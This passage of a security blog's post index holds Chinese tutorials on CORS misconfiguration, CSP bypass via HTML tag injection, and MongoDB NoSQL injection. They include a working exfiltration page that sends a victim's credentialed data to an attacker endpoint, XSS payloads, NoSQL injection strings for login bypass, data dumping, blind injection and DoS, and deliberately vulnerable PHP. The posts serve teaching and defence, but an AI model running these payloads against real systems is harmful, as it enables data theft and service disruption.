jsonp劫持漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"JSONP","slug":"JSONP","permalink":"https://www.mi1k7ea.com/tags/JSONP/"}]},{"title":"CORS跨域漏洞总结","date":"2019-08-18T08:41:21.000Z","path":"2019/08/18/CORS跨域漏洞总结/","text":"0x01 CORS相关基本概念SOPSOP（Same Origin Policy）同源策略，是浏览器的一个安全基石，浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。那么何为同源呢，即两个站点需要满足同协议，同域名，同端口这三个条件。 但随着Web应用的发展，出于一些网络业务的需求，需要实现一些资源的跨域访问，这就造就了一些跨域技术的出现，而下面主要讲下两种最为常见的跨域技术。 JSONPJSONP跨域，就是利用script标签没有跨域限制的特性，使得网页可以从其他来源域动态获取Json数据。JSONP跨域请求一定需要对方的服务器支持才可以。 JSONP实现流程： 服务端必须支持JSONP，且拥有JSONP跨域接口； 浏览器客户端声明一个回调函数，其函数名作为参数值，要传递给跨域请求数据的服务器，函数形参为要获取到的返回目标数据； 创建一个script标签，把跨域的API数据接口加载到src属性，并且在这个地址向服务器传递该回调函数名； 服务器会将数据返回到浏览器客户端，此时客户端会调用回调函数，对返回的数据进行处理； 至于其他关于JSONP更多的东西这里不去探讨，我们重点看下面的CORS跨域。 CORS原理与工作流程CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。 CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。 相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。 CORS跨域访问资源示意图： CORS具体工作流程可分为三步，如图所示： 请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加Origin头，用于声明请求方的源； 资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源； 浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许； 在CORS协议中，请求方还可以指示浏览器在跨域请求中是否带credentials（包括Cookie，TLS客户端证书和代理验证信息）。如果跨域请求中带了credentials，那么浏览器会检查资源服务器返回的响应头中Access-Control-Allow-Credentials头是否设置为true，如果是，则允许请求方读取响应内容，否则，不允许。 基本用法当b.com服务器想要与a.com共享资源内容时，它只需要在HTTP响应中添加如下响应头。这个响应头告诉浏览器放宽SOP限制，允许a.com脚本读取响应内容： 12Access-Control-Allow-Origin: http://a.comAccess-Control-Allow-Credentials: true a.com则可以通过以下JavaScript脚本，跨域读取b.com服务器的内容： 123456789var xhr=new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState == XMLHttpRequest.DONE) &#123; alert(xhr.responseText); &#125; &#125;xhr.open(“GET“, ”http://b.com/api“, true);xhr.withCredentials = true;xhr.send(); 几个关键的HTTP头字段CORS中关键的几个HTTP头字段如下： Access-Control-Allow-Origin：指定哪些外域可以访问本域资源； Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true时，才会发送Cookie； Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE等）来访问资源； Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间； 请求分类浏览器将CORS请求分成两类，即简单请求和非简单请求。 简单请求简单请求满足以下条件： 使用下列方法之一：GET、HEAD、POST HTTP的头信息不超出以下几种字段:Accept、Accept-Language、Content-Language、Content-Type（其值仅限于：application/x-www-form-urlencoded、multipart/form-data、text/plain） 简单请求如图所示，浏览器与服务器之间请求只进行了一次： 非简单请求简单地说就是简单请求以外的请求都算非简单请求。 不满足简单请求条件的请求则要先进行预检请求，即使用OPTIONS方法发起一个预检请求到服务器，用于浏览器询问服务器当前网页所在的域名是否在服务器允许访问的白名单中，以及允许使用哪些HTTP方法和字段等。只有得到服务器肯定的相应，浏览器才会发送正式的XHR请求，否则报错。 关于预检请求，需要注意一下两点： 预检请求对JS来说是透明的，即JS获取不到预检请求的任何信息； 预检请求并不是每次请求都发生，服务端设置的Access-Control-Max-Age头部指定了预检请求的有效期，在有效期内的非简单请求不需要再次发送预检请求； 非简单请求如下所示： 一些跨域场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 应用Demo编写两个不同域下的文件cors.html和cors.php，cors.html放在本域下、目标是跨域获取cors.php中的内容，cors.php放在其他域下，这里本地测试就直接使用不同IP访问代表不同的域名，而不改hosts文件了。 cors.html： 12345678910111213141516&lt;html&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\" /&gt;&lt;title&gt;CORS Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id='userInfo'&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=\"https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; var url = \"http://a.com/cors.php\"; $.get(url, &#123;a:\"getUserInfo\"&#125;, function(data) &#123; $(\"#userInfo\").text(\"Id:\" + data.uid + \" Name:\" + data.name); &#125;, \"json\");&lt;/script&gt;&lt;/html&gt; cors.php，先注释掉CORS跨域必需的相关HTTP头字段： 12345678910111213&lt;?php//header('Access-Control-Allow-Origin: *');//header('Access-Control-Allow-Credentials: true');$a = !empty($_GET['a']) ? trim($_GET['a']) : '';if($a == 'getUserInfo') &#123; echo json_encode(array( 'uid' =&gt; 1, 'name' =&gt; 'mi1k7ea', ));&#125; else &#123; echo '';&#125;?&gt; 访问本域的cors.html，发现不能成功从外域的cors.php中获取内容，在控制台会报错显示没有ACAO字段： 接着我们将cors.php中的那两句注释去掉： 12header('Access-Control-Allow-Origin: *');header('Access-Control-Allow-Credentials: true'); 再次访问本域的cors.html，跨域发现成功获取到外域的cors.php中的响应内容并显示到页面中： 0x02 CORS跨域漏洞漏洞点CORS跨域漏洞的本质是服务器配置不当，即Access-Control-Allow-Origin设置为*或是直接取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。 攻击过程整个攻击过程如下： 用户通过浏览器使用账号密码登录访问正常网站a.com后，此时带有Cookie保持在a.com的登录状态； 攻击者诱使用户在同一浏览器打开访问恶意站点b.com； 用户在访问过a.com的同一浏览器打开访问b.com后，b.com后台接收到用户请求并返回恶意代码给浏览器，让浏览器带上Cookie请求访问a.com页面上的敏感信息； a.com判断用户Cookie信息后，正常处理该恶意请求，并返回敏感数据； 攻击者成功通过CORS跨域漏洞获取到用户的敏感信息； CORS与CSRF的区别一般有CORS漏洞的地方都有CSRF。 CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。 浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。 相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。 不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。 Demo这里本地进行漏洞模拟利用，当然CORS跨域漏洞分无需Cookie和需Cookie的情况，由于无需Cookie的情景过于简单，于是这里仅演示无需Cookie的情况。 目标外域站点放置两个文件，login.php和secret.php。 login.php，用于给用户登录目标站点，此时可以生成对应的Cookie信息： 1234&lt;?phpsetcookie(\"SESSIONid\",\"this_is_session_id_\".time(),time()+3600,\"\",\"\",0);setcookie(\"username\",\"Mi1k7ea_\".time(),time()+3600,\"\",\"\",0,1);?&gt; secret.php，根据请求报文的Origin字段来设置ACAO字段，ACAC字段设置为true，其中含有phpinfo的敏感信息： 1234567&lt;?phpif(isset($_SERVER[\"HTTP_ORIGIN\"])) &#123; header('Access-Control-Allow-Origin:'.$_SERVER[\"HTTP_ORIGIN\"]);&#125;header(\"Access-Control-Allow-Credentials: true\");phpinfo();?&gt; 在本域下放置两个文件，exp.html和save.php。 exp.html，： 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE&gt;&lt;html&gt;&lt;h1&gt;Hello I evil page. &lt;/h1&gt;&lt;script type=\"text/javascript\"&gt;function loadXMLDoc()&#123; var xhr1; var xhr2; if(window.XMLHttpRequest) &#123; xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); &#125; else &#123; xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2= new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; xhr1.onreadystatechange=function() &#123; if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response &#123; var datas=xhr1.responseText; xhr2.open(\"POST\",\"http://127.0.0.1/save.php\",\"true\"); xhr2.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); xhr2.send(\"T1=\"+escape(datas)); &#125; &#125; xhr1.open(\"GET\",\"http://a.com/secret.php\",\"true\") //request user page. xhr1.withCredentials = true; //request with cookie xhr1.send();&#125;loadXMLDoc();&lt;/script&gt;&lt;/html&gt; save.php，当接收到POST方式传递的T1参数内容时，将内容写入当前Web目录的secret.html文件中： 123456&lt;?php$myfile = fopen(\"secret.html\", \"w+\") or die(\"Unable to open file!\");$txt = $_POST['T1'];fwrite($myfile, $txt);fclose($myfile);?&gt; 下面开始模拟攻击场景。 首先受害者访问目标外域站点，需要访问login.php进行登录操作，被目标站点设置了Cookie： 接着登录成功之后，受害者带着Cookie信息可以正常访问secret.php页面，其中是phpinfo信息，包含用户cookie等敏感信息： 在此之后，攻击者向受害者发送一个恶意链接，诱使受害者访问。 当受害者访问过后，可以看到是会带着当前浏览器对目标外域站点维持着的Cookie信息去请求目标外域站点的secret.php获取内容，并将响应内容POST到攻击者的save.php中进行记录： 此时，攻击者只需访问自己本域Web站点根目录下的secret.html即可，当受害者被成功诱使点击之后就会存在该文件并记录下目标外域站点的敏感信息内容： 另外有个注意点，如果目标外域站点的secret.php中的ACAO字段设置为*时，浏览器会阻止我们获取响应报文的内容，因为这是浏览器最后一道防线对用户最后的保护。 0x03 工具推荐Github的项目CORScanner：https://github.com/chenjj/CORScanner 0x04 检测方法黑盒发送请求报文，然后查看响应报文是否包含Access-Control-Allow-Origin字段，若包含且会*则存在CORS跨域漏洞，或若包含但不为*则修改请求报文头的Origin字段查看ACAO是否改变，若改变则说明存在CORS跨域漏洞。 白盒在源码中搜索设置响应报文头字段的代码，如response.setHeader()，检测是否配置或正确配置Access-Control-Allow-Origin和Access-Control-Allow-Credentials字段。 0x05 防御方法 若非必需则不开启CORS； 若业务必需开启CORS，需严格限制外域白名单，禁止使用通配符*，同时尽量避免使用Access-Control-Allow-Credentials头字段； 0x06 参考cors安全部署最佳实践 浅谈跨域威胁与安全 CORS跨域漏洞的学习","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CORS","slug":"CORS","permalink":"https://www.mi1k7ea.com/tags/CORS/"}]},{"title":"利用HTML注入劫持标签Bypass CSP","date":"2019-08-18T04:33:42.000Z","path":"2019/08/18/利用HTML注入劫持标签Bypass-CSP/","text":"0x01 以往劫持方法的局限性在之前的一篇博文《一道绕过CSP的XSS题目》中提到了一种绕过CSP的方法，就是利用JS的特性，通过劫持指定id的标签来实现注入的JS代码能执行。但是这种方法的局限性是十分明显的——即进行劫持注入的地方必须在被劫持的标签的前面，因为浏览器只会从上至下地解析标签，当页面中存在多个相同id的标签的时，浏览器只会解析第一个标签，如果我们注入的位置在后面，那么将无法成功劫持到该标签。 看之前的图就知道了： 我们想劫持的是id为yourname的标签，而我们能够注入的点是id为forminput的标签，可以看到能够注入的标签是在被劫持的标签的前面，所以我们能够成功劫持到id为yourname的标签。 0x02 HTML标签注入如果情况变为了，我们可以注入的点在想被劫持的标签后面，那么我们通过之前的办法还能不能劫持成功？ 我们看个例子： 12345678910111213141516171819&lt;?php$nonce = md5(openssl_random_pseudo_bytes(16));header(&quot;Content-Security-Policy: script-src &apos;nonce-$nonce&apos; &apos;unsafe−eval&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;template_target&quot;&gt;Mi1k7ea&apos;s blog: &lt;/div&gt;&lt;script type=&quot;application/template&quot; id=&quot;template&quot;&gt;https://www.mi1k7ea.com/&lt;/script&gt;Your search is &lt;?php if(isset($_GET[&apos;q&apos;]))&#123;echo $_GET[&apos;q&apos;];&#125; else &#123;echo &apos;empty, but you can input a param called q.&apos;;&#125; ?&gt;&lt;script nonce=&lt;?php echo $nonce;?&gt;&gt; let template = document.getElementById(&apos;template&apos;); template_target.innerHTML = template.innerText.replace(/&#123;&#123;(.*)&#125;&#125;/g,eval)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码很简单，这里模拟的是模板文件的形式，CSP策略设置为script-src &#39;nonce-xxx&#39; &#39;unsafe−eval&#39;;，正常注入XSS payload是执行不成功的，唯一的可利用点是script标签中的eval、它会执行成功正则匹配到的两对大括号里面的内容，但限定了其执行的位置是id为template的标签。 显而易见，我们希望能够劫持的是id为template的标签，因为该标签中的内容会被正则匹配到之后调用eval执行JS代码，但是问题也很明显我们输入的注入点就在id为template的script标签的下面，并不能成功劫持到该标签，我们这里可以试试看，我们注入id为template的div标签，其中内容为符合正则匹配的JS弹框代码： 1?q=&lt;div id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/div&gt; 标签是注入了，id也是template，但是是处于id为template的script标签下面，可以看到并没有触发弹框，因为浏览器只解析了排在前面的第一个id为template的标签。 那么如何去实现劫持呢？——通过注入HTML标签实现劫持。 我们换个标签，将div换成html标签： 1?q=&lt;html id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/html&gt; Bingo，成功弹框，我们看下页面元素看下为啥能够成功劫持： 可以看到，我们注入的id为template的HTML标签，被浏览器解析到当前页面DOM文档的顶部去了，整个页面的HTML标签中的内容都属于id为template的标签内容内，因此其中符合正则匹配的内容都会被匹配到并成功执行。 通过注入HTML标签的方式，我们就可以由在需劫持的标签下面的位置上升为全局的劫持的位置，从而让我们在全局的层面实现了劫持！ 当然，这段HTML标签注入的payload，我在本地的Chrome、IE和360浏览器这些是能够触发成功的，但Firefox不能弹框，然而查看这些浏览器的页面元素都是一样的，至于触发与否应该就是不同浏览器不同机制的原因了。除此之外，这种劫持方法的利用场景在模板文件中会更容易出现。 0x03 参考PagedOut_001_beta1.pdf 第62页","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"NoSQL注入之MongoDB","date":"2019-08-11T08:57:43.000Z","path":"2019/08/11/NoSQL注入之MongoDB/","text":"0x01 NoSQL与MongoDB基本概念NoSQL NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。 NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 NoSQL 数据库分类 类型 部分代表 特点 列存储 HbaseCassandraHypertable 顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。 文档存储 MongoDBCouchDB 文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。 key-value存储 Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis 可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能） 图存储 Neo4JFlockDB 图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。 对象存储 db4oVersant 通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 xml数据库 Berkeley DB XMLBaseX 高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。 MongoDB MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。 MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。 MongoDB概念解析 和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表： SQL术语/概念 MongoDB术语/概念 解释/说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 数据字段/域 index index 索引 table joins 表连接,MongoDB不支持 primary key primary key 主键,MongoDB自动将_id字段设置为主键 0x02 PHP操作MongoDBPHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。 使用MongoDB类中相应的方法使用的Demo大致如下，此时传递进入的参数是一个数组： 123456789&lt;?php$mongo = new MongoClient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$coll-&gt;save(); //增$coll-&gt;find(); //查$coll-&gt;remove(); //减$coll-&gt;update(); //改?&gt; 下面我们一个个执行一遍。 确保连接及选择一个数据库为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。 示例代码如下，访问页面会直接返回数据库名test： 12345&lt;?php$m = new MongoClient(); // 连接默认主机和端口为：mongodb://localhost:27017$db = $m-&gt;test; // 获取名称为 \"test\" 的数据库echo $db;?&gt; 创建集合创建集合的代码片段如下： 123456&lt;?php$m = new MongoClient(); // 连接$db = $m-&gt;test; // 获取名称为 \"test\" 的数据库$collection = $db-&gt;createCollection(\"Mi1k\");echo \"集合创建成功：\".$collection;?&gt; 在数据库中确认确实创建成功： 插入文档在MongoDB中使用insert()方法插入文档，代码片段如下： 1234567891011121314&lt;?php$m = new MongoClient(); // 连接到mongodb$db = $m-&gt;test; // 选择一个数据库$collection = $db-&gt;Mi1k; // 选择集合$document = array( \"title\" =&gt; \"Hello\", \"description\" =&gt; \"Just a test.\", \"likes\" =&gt; 100, \"url\" =&gt; \"https://www.mi1k7ea.com/\", \"by\", \"mi1k7ea\");$collection-&gt;insert($document);echo \"数据插入成功\";?&gt; 插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。： 查找文档使用find()方法来读取集合中的文档，代码片段如下： 1234567891011&lt;?php$m = new MongoClient(); // 连接到mongodb$db = $m-&gt;test; // 选择一个数据库$collection = $db-&gt;Mi1k; // 选择集合$cursor = $collection-&gt;find();// 迭代显示文档标题foreach ($cursor as $document) &#123; echo $document[\"title\"] . \"\\n\";&#125;?&gt; 访问即可看到查询的标题： 更新文档使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World： 12345678910111213&lt;?php$m = new MongoClient(); // 连接到mongodb$db = $m-&gt;test; // 选择一个数据库$collection = $db-&gt;Mi1k; // 选择集合// 更新文档$collection-&gt;update(array(\"title\"=&gt;\"Hello\"), array('$set'=&gt;array(\"title\"=&gt;\"World\")));// 显示更新后的文档$cursor = $collection-&gt;find();// 循环显示文档标题foreach ($cursor as $document) &#123; echo $document[\"title\"] . \"\\n\";&#125;?&gt; 修改后显示改后的标题内容，客户端确认是修改了： 删除文档使用remove()方法来删除文档。 代码片段如下，将移除’title’为’World’的一条数据记录： 1234567891011121314&lt;?php$m = new MongoClient(); // 连接到mongodb$db = $m-&gt;test; // 选择一个数据库$collection = $db-&gt;Mi1k; // 选择集合 // 移除文档$collection-&gt;remove(array(\"title\"=&gt;\"World\"), array(\"justOne\" =&gt; true));// 显示可用文档数据$cursor = $collection-&gt;find();foreach ($cursor as $document) &#123; echo $document[\"title\"] . \"\\n\";&#125;?&gt; 访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。 使用execute()函数执行字符串使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）： 123456789&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$query = \"db.table.save(&#123;'newsid':1&#125;)\"; //增$query = \"db.table.find(&#123;'newsid':1&#125;)\"; //查$query = \"db.table.remove(&#123;'newsid':1&#125;)\"; //减$query = \"db.table.update(&#123;'newsid':1&#125;,&#123;'newsid',2&#125;)\"; 改$result = $db-&gt;execute($query);?&gt; 0x03 NoSQL注入NoSQL注入分类网上主要有两种分类方式，第一种是按照语言的分类：PHP数组注入、JavaScript注入、MongoDB shell拼接注入等等；第二种是按照攻击机制分类：重言式注入、联合查询注入、JavaScript注入等等，这种分类方式很像SQL注入的分类方式。 我们详细讨论下第二种分类方式： 重言式注入又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。 联合查询注入联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。 JavaScript注入这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。 0x04 PHP MongoDB注入攻击不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。 在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的： 1234567891011121314151617181920212223242526&lt;?php$m = new MongoClient(); // 连接到mongodb$db = $m-&gt;test; // 选择一个数据库$collection = $db-&gt;test; // 选择集合$ori = '0123456789abcdefghijklmnopqrstuvwsyz';for ($i=0; $i &lt; 10; $i++) &#123; $str = ''; for ($j=0; $j &lt; 10; $j++) &#123; $str .= $ori[rand(0, strlen($ori)-1)]; &#125; $data = array( 'userid'=&gt;$i, 'username'=&gt;'user'.$i, 'password'=&gt;$str ); $collection-&gt;insert($data);&#125;echo '添加成功&lt;br&gt;';$data = array( 'userid'=&gt;10, 'username'=&gt;'test', 'password'=&gt;'test' );$collection-&gt;insert($data);echo '用户test添加成功';?&gt; 访问触发一遍即可创建成功： PHP数组注入/重言式注入一个数组绑定的查询代码如下： 12345678910111213141516171819202122&lt;?php$mongo = new MongoClient(); // 连接到mongodb$db = $mongo-&gt;test; //选择数据库$coll = $db-&gt;test; //选择集合$username = $_GET['username'];$password = $_GET['password'];$data = array( 'username'=&gt;$username, 'password'=&gt;$password );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) &#123; foreach ($data as $user) &#123; echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; &#125;&#125;else&#123; echo '未找到';&#125;?&gt; 当我们用公共用户test输入时，显示出username和password： 分析一下，这里我输入的是?username=test&amp;password=test，然后进入到MongoDB中的语句其实为db.test.find({username:&#39;test&#39;,password:&#39;test&#39;});。 若此时我们以PHP数组的形式输入?username[a]=test&amp;password=test，源码中$data的值便为： 1234$data = array( 'username'=&gt;array('a'=&gt;'test'), 'password'=&gt;'test' ); 最后实际MongoDB执行的语句为db.test.find({username:{a:&#39;test&#39;},password:&#39;test&#39;});。 因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的： ?username[$ne]=1&amp;password[$ne]=1 $ne即not equal不等于，转换到MongoDB语句即为： db.test.find({username:{&#39;$ne&#39;:&#39;1&#39;},password:{&#39;$ne&#39;:&#39;1&#39;}}); 而该语句相当于： select * from test where username!=&#39;1&#39; and password!=&#39;1&#39;; 直接爆出了所有数据库用户信息： execute()执行拼接字符串导致的注入/联合查询注入代码如下，为了方便查看注入的语句，我这里添加了输出查询语句： 12345678910111213141516171819&lt;?php$username = $_GET['username'];$password = $_GET['password'];$query = \"var data = db.test.findOne(&#123;username:'$username',password:'$password'&#125;);return data;\";echo $query.'&lt;br&gt;';$mongo = new MongoClient();$db = $mongo-&gt;test;$data = $db-&gt;execute($query);if ($data['ok'] == 1) &#123; if ($data['retval']!=NULL) &#123; echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; &#125;else&#123; echo '未找到'; &#125;&#125;else&#123; echo $data['errmsg'];&#125;?&gt; 可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。 正常访问： 添加个单引号试试，发现会报错： 此时可以利用注释或闭合的方法针对性地实现注入就可以了。 利用注释按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回： ?username=test&#39;});return true;})//&amp;password=test 这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看： 没问题，剩下的就是各种payload尝试了。 爆数据库版本： ?username=test&#39;});return {username:db.version(),password:1};})//&amp;password=test 爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写： ?username=test&#39;});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test 爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可： ?username=test&#39;});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test 往user集合插入新用户数据： ?username=test&#39;});return {username:db.user.insert({&#39;username&#39;:&#39;mi1k7ea&#39;,&#39;password&#39;:&#39;mi1k7ea&#39;}),password:1};})//&amp;password=test 利用闭合构造如下payload，用于闭合后面的语句使语法正确： ?username=test&#39;});return {username:db.version(),password:1};var b=({a:&#39;1&amp;password=test 剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）： ?username=test&#39;});if (db.version()&gt;&quot;0&quot;){sleep(10000);exit;}var b=({a:&#39;1&amp;password=test 若数据库版本大于0，则sleep 10s： JavaScript注入/$where注入$where先看下\\$where的概念，使用\\$where运算符可以将包含JavaScript表达式的字符串或完整的JavaScript函数传递给MongoDB来执行，用法如下，筛选出user集合中用户admin的信息： db.user.find({$where:function(){return (hex_md5(this.username)==&quot;21232f297a57a5a743894a0e4a801fc3&quot;)}}) 这里环境用的是Github的一个项目：https://github.com/youngyangyang04/NoSQLInjectionAttackDemo 本次Demo用的是login_1.php，并对其进行了修改，为了方便我也输出了拼接的语句： 1234567891011121314151617181920212223242526272829303132333435&lt;?php$stime=microtime(true);$m = new MongoClient();$db = $m-&gt;test;$collection = $db-&gt;user;$query_body =\"function q() &#123; var username = '\".$_REQUEST[\"username\"].\"'; var password = '\".$_REQUEST[\"password\"].\"';if(username == 'admin'&amp;&amp;password == 'password') return true; else&#123; return false;&#125;&#125;\"; echo $query_body; $result = $collection-&gt;find(array('$where'=&gt;$query_body));$count = $result-&gt;count();$cursor = $collection-&gt;find($result);$doc_failed = new DOMDocument();$doc_failed-&gt;loadHTMLFile(\"failed.html\");$doc_succeed = new DOMDocument();$doc_succeed-&gt;loadHTMLFile(\"succeed.html\");if($count&gt;0)&#123; echo $doc_succeed-&gt;saveHTML(); foreach ($cursor as $user)&#123; echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; &#125;&#125;else&#123; echo $doc_failed-&gt;saveHTML();&#125;$etime=microtime(true);$total=$etime-$stime;$str_total = var_export($total, TRUE);if(substr_count($str_total,\"E\"))&#123; $float_total = floatval(substr($str_total,5)); $total = $float_total/100000; echo $total.'seconds';&#125; else echo $total.'seconds';?&gt; 我们先访问demo_1.html，是个登录界面： 随便输入用户密码登陆，显示错误（这里方便看输入构造处理的语句就没有注释掉输出）： 绕过登录验证针对注入内容所在语句的位置构造返回true的逻辑，即可绕过登录验证： ?username=test&amp;password=a&#39;;return true;var c=&#39; DoS除此之外，还能进行DoS攻击，使目标服务器CPU短暂飙升： ?username=test&amp;password=a&#39;;(function(){var date=new Date();do{curDate=new Date();}while(curDate-date&lt;5000);return Math.max();})();var c=&#39; 可看到程序跑了25s才停止，若当时看目标服务器CPU会发现飙升： 盲注基于时间的盲注基于时间的盲注，是使用sleep()函数结合闭合语句的方式实现的，看前面联合查询注入中的示例就知道了，这里不再多说： ?username=test&#39;});if (db.version()&gt;&quot;0&quot;){sleep(10000);exit;}var b=({a:&#39;1&amp;password=test 有个注意点：这种盲注技巧仅在闭合的情况下可行，用注释符注释后面的语句的情况是行不通的。 基于布尔的盲注基于布尔的盲注，主要是根据字符正确和错误返回不同，利用$regex操作符逐个正则匹配抓取字符，直至将整个字符串匹配出来。 下面看个例子理解一下。 这里我们还是用的这个Github项目：https://github.com/youngyangyang04/NoSQLInjectionAttackDemo 对login.php进行如下修改： 12345678910111213141516171819202122232425262728&lt;?php $m = new MongoClient(); $db = $m-&gt;test; $collection = $db-&gt;user; $dbUsername = null; $dbPassword = null; $data = 